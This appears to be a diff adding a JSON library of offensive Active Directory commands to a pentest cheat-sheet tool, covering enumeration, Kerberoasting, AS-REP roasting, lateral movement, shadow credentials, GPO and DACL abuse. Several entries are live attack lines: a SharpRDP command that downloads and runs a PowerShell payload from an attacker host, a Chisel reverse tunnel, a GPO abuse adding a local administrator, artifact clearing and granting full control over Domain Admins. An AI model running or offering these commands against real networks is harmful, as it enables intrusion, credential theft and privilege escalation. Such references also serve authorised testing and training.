+            "command": "Get-LAPSComputers",
+            "description": "Retrieve computers with LAPS enabled and discover randomized passwords."
+          }
+        ]
+      },
+      {
+        "name": "Credentialed Enumeration",
+        "commands": [
+          {
+            "title": "CrackMapExec SMB Enumeration",
+            "command": "crackmapexec smb {HOST} -u {USERNAME} -p {PASSWORD}",
+            "description": "Enumerate SMB services and validate credentials using CrackMapExec."
+          },
+          {
+            "title": "CrackMapExec Share Enumeration",
+            "command": "crackmapexec smb {HOST} -u {USERNAME} -p {PASSWORD} --shares",
+            "description": "Enumerate SMB shares on the target host using valid credentials."
+          },
+          {
+            "title": "CrackMapExec Logged-on Users",
+            "command": "crackmapexec smb {HOST} -u {USERNAME} -p {PASSWORD} --loggedon-users",
+            "description": "Enumerate currently logged-on users using SMB."
+          },
+          {
+            "title": "WinRM Login",
+            "command": "evil-winrm -i {HOST} -u {USERNAME} -p {PASSWORD}",
+            "description": "Authenticate to the target using WinRM with valid credentials."
+          },
+          {
+            "title": "SMBClient Login",
+            "command": "smbclient \\\\{HOST}\\{SHARE} -U {USERNAME}",
+            "description": "Authenticate to an SMB share using smbclient."
+          }
+        ]
+      },
+      {
+        "name": "Kerberoasting",
+        "commands": [
+          {
+            "title": "GetUserSPNs",
+            "command": "GetUserSPNs.py {DOMAIN}/{USERNAME}:{PASSWORD} -dc-ip {HOST}",
+            "description": "Enumerate Service Principal Names and request Kerberos service tickets."
+          },
+          {
+            "title": "Kerberoast Hashcat",
+            "command": "hashcat -m 13100 kerberoast.hash /usr/share/wordlists/rockyou.txt",
+            "description": "Crack Kerberos TGS hashes using Hashcat."
+          },
+          {
+            "title": "PowerView Kerberoast",
+            "command": "Invoke-Kerberoast",
+            "description": "Enumerate SPNs and extract Kerberos tickets using PowerView."
+          }
+        ]
+      },
+      {
+        "name": "Kerberoasting",
+        "commands": [
+          {
+            "title": "GetUserSPNs",
+            "command": "GetUserSPNs.py {DOMAIN}/{USERNAME}:{PASSWORD} -dc-ip {HOST}",
+            "description": "Enumerate Service Principal Names and request Kerberos service tickets."
+          },
+          {
+            "title": "Kerberoast Hashcat",
+            "command": "hashcat -m 13100 kerberoast.hash /usr/share/wordlists/rockyou.txt",
+            "description": "Crack Kerberos TGS hashes using Hashcat."
+          },
+          {
+            "title": "PowerView Kerberoast",
+            "command": "Invoke-Kerberoast",
+            "description": "Enumerate SPNs and extract Kerberos tickets using PowerView."
+          }
+        ]
+      },
+      {
+        "name": "AS-REP Roasting",
+        "commands": [
+          {
+            "title": "GetNPUsers",
+            "command": "GetNPUsers.py {DOMAIN}/ -usersfile {USERNAME}.txt -dc-ip {HOST}",
+            "description": "Request AS-REP hashes for users without Kerberos pre-authentication."
+          },
+          {
+            "title": "AS-REP Hashcat",
+            "command": "hashcat -m 18200 asrep.hash /usr/share/wordlists/rockyou.txt",
+            "description": "Crack AS-REP hashes using Hashcat."
+          },
+          {
+            "title": "PowerView AS-REP",
+            "command": "Get-DomainUser -PreauthNotRequired",
+            "description": "Enumerate users without Kerberos pre-authentication using PowerView."
+          }
+        ]
+      },
+      {
+        "name": "LDAP Enumeration (Cheat Sheet)",
+        "commands": [
+          {
+            "title": "RDP to Target",
+            "command": "xfreerdp /v:{HOST} /u:{USERNAME} /p:{PASSWORD}",
+            "description": "Connect to the target system via RDP using valid credentials."
+          },
+          {
+            "title": "Get AD Group Info",
+            "command": "Get-ADGroup -Identity \"{GROUP}\" -Properties *",
+            "description": "Retrieve detailed information about a specific Active Directory group."
+          },
+          {
+            "title": "View User Privileges",
+            "command": "whoami /priv",
+            "description": "Display the current user's privilege assignments."
+          },
+          {
+            "title": "Check RSAT Installation",
+            "command": "Get-WindowsCapability -Name RSAT* -Online | Select-Object Name, State",
+            "description": "Check whether RSAT tools are installed on the system."
+          },
+          {
+            "title": "Install RSAT Tools",
+            "command": "Get-WindowsCapability -Name RSAT* -Online | Add-WindowsCapability -Online",
+            "description": "Install all available RSAT tools."
+          },
+          {
+            "title": "Run as Another User",
+            "command": "runas /netonly /user:{DOMAIN}\\{USERNAME} powershell",
+            "description": "Run PowerShell as another domain user without logging them in locally."
+          },
+          {
+            "title": "Enumerate AD Groups (LDAP)",
+            "command": "Get-ADObject -LDAPFilter '(objectClass=group)' | Select-Object cn",
+            "description": "Use an LDAP filter to enumerate all Active Directory groups."
+          },
+          {
+            "title": "List Disabled Users",
+            "command": "Get-ADUser -LDAPFilter '(userAccountControl:1.2.840.113556.1.4.803:=2)' | Select-Object name",
+            "description": "Enumerate disabled user accounts via LDAP."
+          },
+          {
+            "title": "Count Users in OU",
+            "command": "(Get-ADUser -SearchBase \"OU={OU},DC={DOMAIN},DC=LOCAL\" -Filter *).count",
+            "description": "Count all user objects within a specific Organizational Unit."
+          },
+          {
+            "title": "Enumerate Installed Software",
+            "command": "Get-CimInstance win32_product | Format-List",
+            "description": "Query installed software using WMI/CIM."
+          },
+          {
+            "title": "Find Computers by Hostname",
+            "command": "Get-ADComputer -Filter \"DNSHostName -like '*SQL*'\"",
+            "description": "Enumerate computers whose hostnames match a specific pattern."
+          },
+          {
+            "title": "Enumerate Administrative Groups",
+            "command": "Get-ADGroup -Filter \"adminCount -eq 1\" | Select-Object Name",
+            "description": "List groups marked as protected administrative objects."
+          },
+          {
+            "title": "Admins Without Kerberos Pre-Auth",
+            "command": "Get-ADUser -Filter { adminCount -eq 1 -and DoesNotRequirePreAuth -eq $true }",
+            "description": "Find administrative users that do not require Kerberos pre-authentication."
+          },
+          {
+            "title": "Admin UAC Enumeration",
+            "command": "Get-ADUser -Filter { adminCount -gt 0 } -Properties admincount,useraccountcontrol",
+            "description": "Enumerate UserAccountControl values for administrative users."
+          },
+          {
+            "title": "Enumerate AD Groups via WMI",
+            "command": "Get-WmiObject -Class win32_group -Filter \"Domain='{DOMAIN}'\"",
+            "description": "Enumerate Active Directory groups using WMI."
+          },
+          {
+            "title": "Enumerate Computers via ADSI",
+            "command": "([adsisearcher]\"(&(objectClass=Computer))\").FindAll()",
+            "description": "Use ADSI to enumerate all computer objects in the domain."
+          }
+        ]
+      },
+      {
+        "name": "BloodHound Enumeration",
+        "commands": [
+          {
+            "title": "BloodHound Python Collection",
+            "command": "bloodhound-python -u {USERNAME} -p {PASSWORD} -ns {HOST} -d {DOMAIN} -c all",
+            "description": "Collect Active Directory data for BloodHound analysis using Python ingestor."
+          },
+          {
+            "title": "SharpHound Collection",
+            "command": "SharpHound.exe -c All",
+            "description": "Collect Active Directory data using SharpHound from a Windows host."
+          },
+          {
+            "title": "Invoke-BloodHound",
+            "command": "Invoke-BloodHound -CollectionMethod All",
+            "description": "Collect Active Directory data using PowerShell-based BloodHound ingestor."
+          }
+        ]
+      },
+      {
+        "name": "Group Policy & ACL Enumeration",
+        "commands": [
+          {
+            "title": "Enumerate GPOs",
+            "command": "Get-DomainGPO",
+            "description": "Enumerate Group Policy Objects in the domain using PowerView."
+          },
+          {
+            "title": "Enumerate GPO Permissions",
+            "command": "Get-DomainGPO | Get-ObjectAcl",
+            "description": "Enumerate ACLs applied to Group Policy Objects."
+          },
+          {
+            "title": "Enumerate Object ACLs",
+            "command": "Get-ObjectAcl -ResolveGUIDs",
+            "description": "Enumerate and resolve ACL permissions on Active Directory objects."
+          }
+        ]
+      },
+      {
+        "name": "Lateral Movement",
+        "commands": [
+          {
+            "title": "PsExec Remote Command",
+            "command": "psexec.py {DOMAIN}/{USERNAME}:{PASSWORD}@{HOST}",
+            "description": "Execute commands remotely using PsExec with valid credentials."
+          },
+          {
+            "title": "WMIC Remote Execution",
+            "command": "wmic /node:{HOST} /user:{USERNAME} /password:{PASSWORD} process call create \"cmd.exe\"",
+            "description": "Execute commands remotely using WMIC."
+          },
+          {
+            "title": "WinRM Remote Shell",
+            "command": "evil-winrm -i {HOST} -u {USERNAME} -p {PASSWORD}",
+            "description": "Obtain an interactive WinRM shell on the remote system."
+          }
+        ]
+      },
+      {
+        "name": "PowerView Enumeration (Cheat Sheet)",
+        "commands": [
+          {
+            "title": "RDP to Target",
+            "command": "xfreerdp /v:{HOST} /u:{USERNAME} /p:{PASSWORD}",
+            "description": "Connect to the target system via RDP using valid credentials."
+          },
+          {
+            "title": "View Domain Password Policy",
+            "command": "Get-DomainPolicy",
+            "description": "Retrieve the domain password and lockout policy."
+          },
+          {
+            "title": "Convert Username to SID",
+            "command": ".\\SharpView.exe ConvertTo-SID -Name {USERNAME}",
+            "description": "Convert a username into its corresponding Security Identifier (SID)."
+          },
+          {
+            "title": "Convert SID to Username",
+            "command": ".\\SharpView.exe Convert-ADName -ObjectName {SID}",
+            "description": "Resolve a SID back to the associated username."
+          },
+          {
+            "title": "List User UAC Values",
+            "command": "Get-DomainUser {USERNAME} | ConvertFrom-UACValue -ShowAll",
+            "description": "List all UserAccountControl (UAC) flags for a specific user."
+          },
+          {
+            "title": "Get Domain Info",
+            "command": ".\\SharpView.exe Get-Domain",
+            "description": "Display information about the current Active Directory domain."
+          },
+          {
+            "title": "List Domain OUs",
+            "command": ".\\SharpView.exe Get-DomainOU",
+            "description": "Enumerate all Organizational Units in the domain."
+          },
+          {
+            "title": "Find AS-REP Roastable Users",
+            "command": ".\\SharpView.exe Get-DomainUser -KerberosPreauthNotRequired",
+            "description": "Find users vulnerable to AS-REP Roasting."
+          },
+          {
+            "title": "List Domain Computers",
+            "command": "Get-DomainComputer",
+            "description": "Enumerate all computer objects in the domain."
+          },
+          {
+            "title": "List GPO Names",
+            "command": ".\\SharpView.exe Get-DomainGPO | findstr displayname",
+            "description": "List the display names of all Group Policy Objects."
+          },
+          {
+            "title": "List GPOs Applied to Host",
+            "command": "Get-DomainGPO -ComputerIdentity {HOST}",
+            "description": "Enumerate GPOs applied to a specific computer."
+          },
+          {
+            "title": "Test Local Admin Access",
+            "command": "Test-AdminAccess -ComputerName {HOST}",
+            "description": "Check whether the current user has local admin rights on a remote host."
+          },
+          {
+            "title": "Enumerate Remote Shares",
+            "command": ".\\SharpView.exe Get-NetShare -ComputerName {HOST}",
+            "description": "Enumerate accessible network shares on a remote computer."
+          },
+          {
+            "title": "Find Logged-on Users",
+            "command": "Find-DomainUserLocation",
+            "description": "Locate systems where domain users are currently logged in."
+          },
+          {
+            "title": "Enumerate Domain Trusts",
+            "command": "Get-DomainTrust",
+            "description": "List trust relationships for the current domain."
+          },
+          {
+            "title": "Count Domain Users",
+            "command": "(Get-DomainUser).count",
+            "description": "Count all user objects in the domain."
+          },
+          {
+            "title": "SharpView Help",
+            "command": ".\\SharpView.exe Get-DomainUser -Help",
+            "description": "Display help information for SharpView functions."
+          },
+          {
+            "title": "Find Users with Descriptions",
+            "command": "Get-DomainUser -Properties samaccountname,description | Where-Object { $_.description -ne $null }",
+            "description": "Identify users with non-empty description fields."
+          },
+          {
+            "title": "Find Users with SPNs",
+            "command": ".\\SharpView.exe Get-DomainUser -SPN",
+            "description": "Enumerate users that have Service Principal Names configured."
+          },
+          {
+            "title": "Find Foreign Group Members",
+            "command": "Find-ForeignGroup",
+            "description": "Identify users from external domains in local groups."
+          },
+          {
+            "title": "List Domain Groups",
+            "command": "Get-DomainGroup -Properties Name",
+            "description": "Enumerate all domain groups."
+          },
+          {
+            "title": "Get Group Members",
+            "command": ".\\SharpView.exe Get-DomainGroupMember -Identity \"{GROUP}\"",
+            "description": "List members of a specific domain group."
+          },
+          {
+            "title": "List Protected Groups",
+            "command": ".\\SharpView.exe Get-DomainGroup -AdminCount",
+            "description": "Enumerate protected administrative groups."
+          },
+          {
+            "title": "Find Managed Security Groups",
+            "command": ".\\SharpView.exe Find-ManagedSecurityGroups",
+            "description": "Enumerate managed security groups in the domain."
+          },
+          {
+            "title": "Get Local Groups on Host",
+            "command": "Get-NetLocalGroup -ComputerName {HOST}",
+            "description": "Enumerate local groups on a remote system."
+          },
+          {
+            "title": "Get Local Group Members",
+            "command": ".\\SharpView.exe Get-NetLocalGroupMember -ComputerName {HOST}",
+            "description": "List members of a local group on a remote host."
+          },
+          {
+            "title": "Find Unconstrained Delegation",
+            "command": ".\\SharpView.exe Get-DomainComputer -Unconstrained",
+            "description": "Find computers configured with unconstrained delegation."
+          },
+          {
+            "title": "Find Constrained Delegation",
+            "command": "Get-DomainComputer -TrustedToAuth",
+            "description": "Enumerate computers configured for constrained delegation."
+          },
+          {
+            "title": "Enumerate User ACLs",
+            "command": "Get-DomainObjectAcl -Identity {USERNAME}",
+            "description": "Enumerate ACLs applied to a specific user object."
+          },
+          {
+            "title": "Find Interesting Domain ACLs",
+            "command": "Find-InterestingDomainAcl",
+            "description": "Identify domain objects with potentially dangerous permissions."
+          },
+          {
+            "title": "Get Path ACLs",
+            "command": "Get-PathAcl \"\\\\{HOST}\\\\{SHARE}\"",
+            "description": "Enumerate filesystem ACLs for a remote directory."
+          },
+          {
+            "title": "GPO Resultant Set",
+            "command": "gpresult /r /S {HOST}",
+            "description": "Display all GPOs applied to a specific host."
+          },
+          {
+            "title": "Enumerate GPO ACLs",
+            "command": "Get-DomainGPO | Get-ObjectAcl",
+            "description": "Enumerate permissions applied to Group Policy Objects."
+          },
+          {
+            "title": "Domain Trust Mapping",
+            "command": "Get-DomainTrustMapping",
+            "description": "Enumerate trust paths for reachable domains."
+          }
+        ]
+      },
+      {
+        "name": "BloodHound Collection (Cheat Sheet)",
+        "commands": [
+          {
+            "title": "RDP to Target",
+            "command": "xfreerdp /v:{HOST} /u:{USERNAME} /p:{PASSWORD}",
+            "description": "Connect to the target system via RDP using valid credentials."
+          },
+          {
+            "title": "SharpHound C# Ingestor",
+            "command": ".\\SharpHound.exe -c all --zipfilename {DOMAIN}_bloodhound",
+            "description": "Collect Active Directory data using the SharpHound C# ingestor and output it as a ZIP file."
+          },
+          {
+            "title": "SharpHound PowerShell Ingestor",
+            "command": "Invoke-BloodHound -CollectionMethod All -ZipFileName {DOMAIN}_bloodhound",
+            "description": "Collect Active Directory data using the PowerShell-based SharpHound ingestor."
+          },
+          {
+            "title": "BloodHound Python Ingestor",
+            "command": "bloodhound-python -dc {HOST} -gc {HOST} -d {DOMAIN} -c All -u {USERNAME} -p {PASSWORD}",
+            "description": "Collect Active Directory data remotely using the bloodhound-python ingestor."
+          },
+          {
+            "title": "RDP with Drive Redirection",
+            "command": "xfreerdp /v:{HOST} /u:{USERNAME} /drive:data,{LOCAL_PATH}",
+            "description": "Transfer files to and from the target host using RDP drive redirection."
+          }
+        ]
+      }
+    ]
+  },
+  {
+    "id": "custom-1768837259720",
+    "name": "Lateral MOV",
+    "color": "#ff6b6b",
+    "categories": [
+      {
+        "name": "Lateral Movement",
+        "commands": []
+      }
+    ]
+  },
+  {
+    "id": "custom-1768837435646",
+    "name": "Lateral-MOV",
+    "color": "#ff6b6b",
+    "categories": [
+      {
+        "name": "Remote Desktop Protocol (RDP)",
+        "commands": [
+          {
+            "title": "Open RDP Client",
+            "command": "mstsc.exe",
+            "description": "Launch the Remote Desktop Connection client."
+          },
+          {
+            "title": "RDP Restricted Admin Mode",
+            "command": "mstsc.exe /restrictedAdmin",
+            "description": "Open RDP in Restricted Admin mode."
+          },
+          {
+            "title": "Query Restricted Admin Setting",
+            "command": "reg query HKLM\\SYSTEM\\CurrentControlSet\\Control\\Lsa /v DisableRestrictedAdmin",
+            "description": "Check Restricted Admin configuration in the registry."
+          },
+          {
+            "title": "Disable Restricted Admin",
+            "command": "reg add HKLM\\SYSTEM\\CurrentControlSet\\Control\\Lsa /v DisableRestrictedAdmin /d 0 /t REG_DWORD",
+            "description": "Disable Restricted Admin mode."
+          },
+          {
+            "title": "Enable Restricted Admin",
+            "command": "reg add HKLM\\SYSTEM\\CurrentControlSet\\Control\\Lsa /v DisableRestrictedAdmin /d 1 /t REG_DWORD",
+            "description": "Enable Restricted Admin mode."
+          },
+          {
+            "title": "Chisel SOCKS Tunnel",
+            "command": ".\\chisel.exe client {ATTACK_HOST}:{PORT} R:socks",
+            "description": "Create a SOCKS proxy tunnel using Chisel."
+          },
+          {
+            "title": "Rubeus NetOnly Session",
+            "command": ".\\Rubeus.exe createnetonly /program:powershell.exe /show",
+            "description": "Create a sacrificial logon session."
+          },
+          {
+            "title": "Rubeus AskTGT",
+            "command": ".\\Rubeus.exe asktgt /user:{USERNAME} /rc4:{NTLM_HASH} /domain:{DOMAIN} /ptt",
+            "description": "Request and inject a Kerberos TGT."
+          },
+          {
+            "title": "SharpRDP Command Execution",
+            "command": ".\\SharpRDP.exe computername={HOST} command=\"powershell.exe IEX(New-Object Net.WebClient).DownloadString('http://{ATTACK_HOST}/s')\" username={DOMAIN}\\{USERNAME} password={PASSWORD}",
+            "description": "Execute a PowerShell payload over RDP."
+          },
+          {
+            "title": "Compile CleanRunMRU",
+            "command": "C:\\Windows\\Microsoft.NET\\Framework\\v4.0.30319\\csc.exe .\\CleanRunMRU.cs",
+            "description": "Compile CleanRunMRU using the C# compiler."
+          },
+          {
+            "title": "Execute CleanRunMRU",
+            "command": ".\\CleanRunMRU.exe clearall",
+            "description": "Clear RunMRU artifacts."
+          }
+        ]
+      },
+      {
+        "name": "Server Message Block (SMB)",
+        "commands": [
+          {
+            "title": "PsExec Remote Command",
+            "command": ".\\PsExec.exe \\\\{HOST} -i -s -u {DOMAIN}\\{USERNAME} -p {PASSWORD} cmd",
+            "description": "Execute a command remotely using PsExec."
+          },
+          {
+            "title": "SharpNoPSExec",
+            "command": ".\\SharpNoPSExec.exe --target={HOST} --payload=\"cmd.exe /c powershell -e {PAYLOAD}\"",
+            "description": "Execute commands remotely without PsExec."
+          },
+          {
+            "title": "NimExec Remote Execution",
+            "command": ".\\NimExec -u {USERNAME} -d {DOMAIN} -p {PASSWORD} -t {HOST} -c \"cmd.exe /c powershell -e {PAYLOAD}\" -v",
+            "description": "Execute remote commands over SMB using NimExec."
+          },
+          {
+            "title": "Enable SMB Guest Access",
+            "command": "reg.exe add HKLM\\SYSTEM\\CurrentControlSet\\Services\\LanmanWorkstation\\Parameters /v AllowInsecureGuestAuth /d 1 /t REG_DWORD /f",
+            "description": "Enable insecure SMB guest authentication."
+          }
+        ]
+      },
+      {
+        "name": "Windows Management Instrumentation (WMI)",
+        "commands": [
+          {
+            "title": "WMIC OS Enumeration",
+            "command": "wmic /node:{HOST} os get Caption,CSDVersion,OSArchitecture,Version",
+            "description": "Enumerate OS details using WMIC."
+          },
+          {
+            "title": "PowerShell WMI OS Enumeration",
+            "command": "Get-WmiObject -Class Win32_OperatingSystem -ComputerName {HOST} | Select-Object Caption,CSDVersion,OSArchitecture,Version",
+            "description": "Enumerate OS details using PowerShell."
+          },
+          {
+            "title": "WMIC Remote Process",
+            "command": "wmic /node:{HOST} process call create \"notepad.exe\"",
+            "description": "Execute a remote process using WMIC."
+          },
+          {
+            "title": "Invoke-WmiMethod Remote Command",
+            "command": "Invoke-WmiMethod -Class Win32_Process -Name Create -ArgumentList \"notepad.exe\" -ComputerName {HOST}",
+            "description": "Execute a process remotely using PowerShell WMI."
+          }
+        ]
+      },
+      {
+        "name": "Windows Remote Management (WinRM)",
+        "commands": [
+          {
+            "title": "Invoke Command (WinRM)",
+            "command": "Invoke-Command -ComputerName {HOST} -ScriptBlock { hostname; whoami }",
+            "description": "Execute commands remotely via WinRM."
+          },
+          {
+            "title": "Authenticated WinRM Command",
+            "command": "Invoke-Command -ComputerName {HOST} -Credential $credential -ScriptBlock { whoami; hostname }",
+            "description": "Execute commands remotely using credentials."
+          },
+          {
+            "title": "WinRS Execution",
+            "command": "winrs -r:{HOST} \"powershell -c whoami; hostname\"",
+            "description": "Execute commands using WinRS."
+          },
+          {
+            "title": "PowerShell Session Management",
+            "command": "New-PSSession -ComputerName {HOST} -Credential $credential",
+            "description": "Create a persistent PowerShell session."
+          }
+        ]
+      },
+      {
+        "name": "Distributed Component Object Model (DCOM)",
+        "commands": [
+          {
+            "title": "Query ShellWindows CLSID",
+            "command": "Get-ChildItem HKLM:\\SOFTWARE\\Classes\\CLSID | ForEach-Object { Get-ItemProperty $_.PSPath }",
+            "description": "Enumerate CLSIDs from the registry."
+          },
+          {
+            "title": "Create ShellWindows Instance",
+            "command": "[activator]::CreateInstance([type]::GetTypeFromCLSID('C08AFD90-F2A1-11D1-8455-00A0C91F3880','{HOST}'))",
+            "description": "Instantiate a remote ShellWindows COM object."
+          }
+        ]
+      },
+      {
+        "name": "Secure Shell (SSH)",
+        "commands": [
+          {
+            "title": "SSH Login",
+            "command": "ssh {USERNAME}@{HOST}",
+            "description": "Connect to a remote host using SSH."
+          },
+          {
+            "title": "SSH with Key",
+            "command": "ssh -i {KEY_PATH} -l {USERNAME}@{DOMAIN} -p {PORT} {HOST}",
+            "description": "Authenticate using an SSH private key."
+          },
+          {
+            "title": "Check SSH Key Permissions",
+            "command": "icacls.exe {KEY_PATH}",
+            "description": "View ACLs on an SSH private key file."
+          }
+        ]
+      },
+      {
+        "name": "Remote Management Tools",
+        "commands": [
+          {
+            "title": "Test Remote Port",
+            "command": "Test-NetConnection -ComputerName {HOST} -Port {PORT}",
+            "description": "Test connectivity to a remote service."
+          },
+          {
+            "title": "Query TightVNC Settings",
+            "command": "reg query HKLM\\SOFTWARE\\TightVNC\\Server /s",
+            "description": "Enumerate TightVNC configuration from the registry."
+          }
+        ]
+      }
+    ]
+  },
+  {
+    "id": "custom-1768838715650",
+    "name": "DACL",
+    "color": "#ff6b6b",
+    "categories": [
+      {
+        "name": "Shadow Credentials",
+        "commands": [
+          {
+            "title": "Connect via RDP",
+            "command": "xfreerdp /u:{USER} /p:{PASSWORD} /d:{DOMAIN} /v:{IP} /dynamic-resolution /drive:.,linux",
+            "description": "Connect to RDP with dynamic resolution and drive mapping."
+          },
+          {
+            "title": "Query msDS-KeyCredentialLink",
+            "command": "Get-DomainUser -Filter '(msDS-KeyCredentialLink=*)'",
+            "description": "Find users with msDS-KeyCredentialLink set using PowerView."
+          },
+          {
+            "title": "List Key Credentials",
+            "command": ".\\Whisker.exe list /target:{TARGET}",
+            "description": "List Key Credential attributes with Whisker."
+          },
+          {
+            "title": "Add Key Credentials",
+            "command": ".\\Whisker.exe add /target:{TARGET}",
+            "description": "Add key credentials to a target using Whisker."
+          },
+          {
+            "title": "Retrieve TGT & NTLM Hash",
+            "command": ".\\Rubeus.exe asktgt /user:{USER} /certificate:{CERTIFICATE} /password:\"{PASSWORD}\" /domain:{DOMAIN} /dc:{DC} /getcredentials /show",
+            "description": "Retrieve TGT and NTLM hash using Rubeus."
+          },
+          {
+            "title": "Create Sacrificial Logon Session",
+            "command": ".\\Rubeus.exe createnetonly /program:powershell.exe /show",
+            "description": "Create a sacrificial logon session for attacks."
+          },
+          {
+            "title": "Pass-the-Ticket",
+            "command": ".\\Rubeus.exe ptt /ticket:{BASE64}",
+            "description": "Pass the ticket into memory using Rubeus."
+          },
+          {
+            "title": "Remove Key Credential",
+            "command": ".\\Whisker.exe remove /target:{TARGET} /deviceid:{DEVICEID}",
+            "description": "Remove a specific key credential from a target."
+          },
+          {
+            "title": "Clear Key Credentials",
+            "command": ".\\Whisker.exe clear /target:{TARGET}",
+            "description": "Remove all key credentials from a target."
+          }
+        ]
+      },
+      {
+        "name": "Logon Scripts",
+        "commands": [
+          {
+            "title": "Set logon script",
+            "command": "bloodyAD --host \"{DC_IP}\" -d \"{DOMAIN}\" -u \"{USER}\" -p '{PASSWORD}' set object {TARGET_USER} scriptPath -v '{PATH}'",
+            "description": "Set logon script for a user using bloodyAD."
+          },
+          {
+            "title": "Get logon script",
+            "command": "bloodyAD --host \"{DC_IP}\" -d \"{DOMAIN}\" -u \"{USER}\" -p '{PASSWORD}' get object {TARGET_USER} --attr scriptPath",
+            "description": "Retrieve the logon script for a user."
+          },
+          {
+            "title": "Check ACLs on NETLOGON",
+            "command": "smbcacls //{DC_IP}/NETLOGON {DIR} -U {USER}%{PASSWORD}",
+            "description": "View permissions on NETLOGON folders."
+          },
+          {
+            "title": "Get ACEs with PywerView",
+            "command": "pywerview get-objectacl --name '{TARGET_USER}' -w {DOMAIN} -t {DC_IP} -u '{USER}' -p '{PASSWORD}' --resolve-sids --resolve-guids",
+            "description": "Retrieve ACEs of a user over another object."
+          },
+          {
+            "title": "Set logon script with PowerView",
+            "command": "Set-DomainObject {TARGET_USER} -Set @{'scriptPath'='{PATH}'}",
+            "description": "Modify a user's logon script path using PowerView."
+          }
+        ]
+      },
+      {
+        "name": "SPN Jacking",
+        "commands": [
+          {
+            "title": "List WriteSPN in BloodHound",
+            "command": "MATCH p=(n:User)-[r1:WriteSPN*1..]->(c:Computer) RETURN p",
+            "description": "Query SPN write rights in BloodHound."
+          },
+          {
+            "title": "List WriteSPN permissions with PowerView",
+            "command": "Get-DomainComputer | Get-DomainObjectAcl -ResolveGUIDs | ?{$_.SecurityIdentifier -eq $(ConvertTo-SID {USER})}",
+            "description": "Retrieve computers where user has WriteSPN rights."
+          },
+          {
+            "title": "Execute S4U Attack",
+            "command": ".\\Rubeus.exe s4u /domain:{DOMAIN} /user:{USER} /rc4:{HASH} /impersonateuser:{ADMIN} /msdsspn:\"{SPN}\" /nowrap",
+            "description": "Forge a service ticket as another user using S4U2Self/Proxy."
+          },
+          {
+            "title": "Pass-the-Ticket",
+            "command": ".\\Rubeus.exe ptt /ticket:{BASE64}",
+            "description": "Use a ticket to impersonate a service account."
+          }
+        ]
+      },
+      {
+        "name": "sAMAccountName Spoofing",
+        "commands": [
+          {
+            "title": "Scan for NoPAC",
+            "command": ".\\noPac.exe scan -domain {DOMAIN} -user {USER} -pass {PASSWORD}",
+            "description": "Scan for NoPAC vulnerability on a Windows domain."
+          },
+          {
+            "title": "Check MachineAccountQuota",
+            "command": "(Get-DomainObject -SearchScope Base).\"ms-ds-machineaccountquota\"",
+            "description": "Query ms-DS-MachineAccountQuota attribute with PowerView."
+          },
+          {
+            "title": "Create a Machine Account",
+            "command": "New-MachineAccount -MachineAccount \"{ACCOUNT}\" -Password $password -Domain {DOMAIN} -DomainController {DC_IP}",
+            "description": "Create a new machine account to abuse ms-DS-MachineAccountQuota."
+          },
+          {
+            "title": "Request TGT for Machine Account",
+            "command": ".\\Rubeus.exe asktgt /user:{USER} /password:{PASSWORD} /domain:{DOMAIN} /dc:{DC_IP} /nowrap",
+            "description": "Request a TGT for a machine account using Rubeus."
+          }
+        ]
+      },
+      {
+        "name": "GPO Attacks",
+        "commands": [
+          {
+            "title": "Get all GPOs",
+            "command": "Get-DomainGPO",
+            "description": "Retrieve all GPOs in the domain."
+          },
+          {
+            "title": "Query GPO ACLs",
+            "command": "Get-DomainObjectAcl -ResolveGUIDs",
+            "description": "Get Active Directory rights affecting GPOs."
+          },
+          {
+            "title": "Abuse GPO to Add Local Admin",
+            "command": "SharpGPOAbuse.exe --AddLocalAdmin --UserAccount {USER} --GPOName \"Default Security Policy - WKS\"",
+            "description": "Use SharpGPOAbuse to escalate privileges via a GPO."
+          },
+          {
+            "title": "Backup GPO",
+            "command": "proxychains4 -q python3 GPOwned.py -u {USER} -p {PASSWORD} -d {DOMAIN} -dc-ip {DC_IP} -gpcmachine -backup backupgpo -name \"{GPO_ID}\"",
+            "description": "Backup a GPO before modifying it."
+          },
+          {
+            "title": "Abuse GPO with pyGPOAbuse",
+            "command": "proxychains4 -q python3 pygpoabuse.py {DOMAIN}/{USER}:{PASSWORD} -gpo-id {GPO_ID} -command \"net user plaintext Password1234 /add && net localgroup Administrators plaintext /add\" -taskname \"PT_LocalAdmin\" -description \"this is a GPO test\" -dc-ip {DC_IP} -v",
+            "description": "Add a local admin using a GPO with pyGPOAbuse."
+          }
+        ]
+      },
+      {
+        "name": "Read DACLs",
+        "commands": [
+          {
+            "title": "Get DACL for User",
+            "command": "Get-DomainObjectAcl -Identity {TARGET_USER}",
+            "description": "Enumerate the ACLs for a specific user in AD."
+          },
+          {
+            "title": "Find Interesting Domain ACLs",
+            "command": "Find-InterestingDomainAcl",
+            "description": "Locate objects with modifications rights over non-builtin accounts."
+          },
+          {
+            "title": "Read DACL for Specific Target",
+            "command": "Get-DomainObjectAcl -Identity {TARGET_OBJECT} -ResolveGUIDs",
+            "description": "Retrieve resolved ACLs on the target object."
+          },
+          {
+            "title": "Read Domain-wide DACLs",
+            "command": "Get-DomainObjectAcl -Principals {USER} -ResolveGUIDs",
+            "description": "Get all objects in the domain where a user has permissions."
+          }
+        ]
+      },
+      {
+        "name": "DCSync Privileges",
+        "commands": [
+          {
+            "title": "Find Objects with DCSync Rights",
+            "command": "Get-DomainObjectAcl -ResolveGUIDs | Where-Object {$_.ActiveDirectoryRights -match 'GenericAll'}",
+            "description": "Identify accounts with rights that allow DCSync."
+          },
+          {
+            "title": "Read ACLs for DCSync",
+            "command": "cme ldap {DC} -u {USER} -p {PASSWORD} -M daclread -o TARGET_DN={TARGET_USER} ACTION=read RIGHTS=DCSync",
+            "description": "Read ACLs specifically for DCSync privileges using CME."
+          },
+          {
+            "title": "Get ACEs with Full Control",
+            "command": "Get-DomainObjectAcl -ResolveGUIDs | Where-Object {$_.ActiveDirectoryRights -eq 'GenericAll'}",
+            "description": "Find all accounts with full control over objects."
+          }
+        ]
+      },
+      {
+        "name": "Abuse DACLs",
+        "commands": [
+          {
+            "title": "Add Self to Admin Group via DACL",
+            "command": "Add-DomainObjectAcl -TargetIdentity 'Domain Admins' -Rights 'GenericAll' -PrincipalIdentity {USER}",
+            "description": "Modify ACLs to give yourself full control over Domain Admins."
+          },
+          {
+            "title": "Take Ownership of Object",
+            "command": "Add-DomainObjectAcl -TargetIdentity {TARGET_OBJECT} -Rights 'GenericAll' -PrincipalIdentity {USER}",
+            "description": "Take ownership of an object by abusing DACL rights."
+          },
+          {
+            "title": "Write DACL to Elevate Privileges",
